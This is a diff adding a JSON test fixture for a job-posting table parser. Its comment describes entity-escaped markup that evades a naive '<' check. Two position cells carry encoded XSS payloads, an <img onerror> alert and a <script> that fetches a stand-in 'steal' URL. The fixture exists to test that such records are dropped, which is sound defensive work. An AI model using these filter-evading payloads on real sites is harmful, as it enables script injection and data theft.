@@ -1,0 +1,20 @@
+{
+  "$comment": "Three postings. In the first the position cell holds entity-escaped markup that contains no '<' character at all, so it survives any check that looks for one, yet decodes to an <img> with an error handler the moment it is assigned to innerHTML. The second is the same trick with a <script>. The third is clean, and must be unaffected by its neighbours. The first two records are dropped with a warning; the third is kept.",
+  "case": "entity-escaped-markup-in-title",
+  "payload": {
+    "data": [
+      {
+        "id": 91,
+        "body": "<table><thead><tr><th>Position</th><th>Location</th><th>Last date to apply</th></tr></thead><tbody><tr><td>&lt;img src=x onerror=alert(1)&gt;Portfolio Assistant</td><td>Banke</td><td>2026-12-20</td></tr></tbody></table>"
+      },
+      {
+        "id": 92,
+        "body": "<table><thead><tr><th>Position</th><th>Location</th><th>Last date to apply</th></tr></thead><tbody><tr><td>&lt;script&gt;fetch('https://elsewhere.example/steal')&lt;/script&gt;Verification Officer</td><td>Jhapa</td><td>2026-12-25</td></tr></tbody></table>"
+      },
+      {
+        "id": 93,
+        "body": "<table><thead><tr><th>Position</th><th>Location</th><th>Last date to apply</th></tr></thead><tbody><tr><td>Clean Officer</td><td>Sunsari</td><td>2026-12-30</td></tr></tbody></table>"
+      }
+    ]
+  }
+}
